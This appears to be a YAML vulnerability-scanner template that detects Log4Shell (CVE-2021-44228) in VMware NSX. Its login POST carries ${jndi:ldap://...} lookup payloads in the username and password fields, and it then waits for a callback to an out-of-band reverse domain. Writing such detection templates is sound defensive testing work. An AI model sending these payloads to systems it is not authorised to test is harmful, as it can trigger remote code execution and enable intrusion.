name: VMware_NSX_Log4shell_CVE_2021_44228
transport: http
set:
  reverse: newReverse()
  reverseDomain: reverse.domain
detail:
  dock: ( title="VMware Appliance Management" | title="VMware NSX")
  product: VMware NSX
  homepage: https://www.vmware.com/
  impact: ''
  description: VMware NSX 存在log4j漏洞。
rules:
  r1:
    method: GET
    path: /login.jsp
    follow_redirects: false
    expression: response.status == 200
  r2:
    method: POST
    path: /login
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: username=${jndi:ldap://{{reverseDomain}}/tea}&password=${jndi:ldap://{{reverseDomain}}/lol}&submit=
    expression: ''
  r3:
    method: GET
    path: /login.jsp?login_error=1
    follow_redirects: false
    expression: response.status == 200 && reverse.wait(5)
expression: r1() && r2() && r3()
